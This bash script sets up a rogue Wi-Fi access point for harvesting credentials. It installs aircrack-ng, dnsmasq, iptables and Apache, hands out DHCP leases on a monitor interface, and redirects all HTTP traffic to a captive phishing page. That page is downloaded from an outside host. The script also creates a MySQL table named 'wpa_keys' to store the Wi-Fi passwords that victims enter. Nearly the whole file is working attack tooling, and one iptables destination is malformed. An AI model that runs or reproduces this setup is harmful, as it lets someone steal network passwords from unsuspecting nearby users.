#!/bin/bash

#Install tools //checked
sudo apt-get update
sudo apt-get install aircrack-ng dnsmasq iptables apache2 -y
echo "Done install"

#Config file dnsmasq //checked 
cd ~
touch dnsmasq.conf
echo -e 'interface=at0\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1' > dnsmasq.conf
echo "done dns "

#config iptable rules //checked
sudo iptables --flush
sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80/Rogue_AP/
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

echo "done rule "

#enable ip forwarding //done
sudo su <<HERE
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
HERE
echo "done ipfw "

#start service // checked done 
sudo /etc/init.d/apache2 start
sudo /etc/init.d/mysql start

echo "done service"

#Web configuration //checked
cd ~/Downloads
wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip
sudo unzip Rogue_AP.zip -d /var/www/html/
cd /var/www/html/
sudo chmod 755 Rogue_AP
cd Rogue_AP
sudo chmod 755 *

echo "done configweb "

#mysql db //checked
sudo mysql -e "create user fakeap@localhost identified by 'fakeap';"
sudo mysql -e "create database rogue_AP;"
sudo mysql -e "use rogue_AP;create table wpa_keys(password1 varchar(32),password2 varchar(32));"
sudo mysql -e "grant all privileges on rogue_AP.* to 'fakeap'@'localhost';"

echo "done DB "

